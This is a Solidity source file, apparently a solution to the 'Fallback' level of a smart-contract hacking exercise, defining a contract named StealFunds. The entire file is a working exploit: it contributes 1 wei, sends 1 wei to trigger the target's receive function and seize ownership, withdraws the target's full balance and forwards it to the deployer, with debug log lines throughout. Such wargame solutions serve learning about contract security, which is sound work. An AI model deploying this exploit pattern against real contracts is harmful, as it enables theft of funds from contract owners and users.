// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Fallback.sol";
import "hardhat/console.sol";

contract StealFunds {
    Fallback private _fallbackContract;
    address payable private _thieve;

    constructor(address fallbackContract) public {
        _fallbackContract = Fallback(payable(fallbackContract));
        _thieve = msg.sender;
    }

    function stealFunds() public payable returns (bool success) {
        // check that this contract has some funds
        console.log("passing0");
        require(msg.sender == _thieve);
        require(msg.value > 1);
        // contribute to the Fallback contract with 1 Wei
        console.log("passing1");
        _fallbackContract.contribute.value(1)();
        // call the receive function of the Fallback contract with 1 Wei
        console.log("passing2");
        address(_fallbackContract).transfer(1);
        // withdraw the full balance of the Fallback contract
        console.log("passing3");
        _fallbackContract.withdraw();
        // transfer the balance of this to the msg.sender
        console.log("passing4");
        _thieve.transfer(address(this).balance);

        return true;
    }
}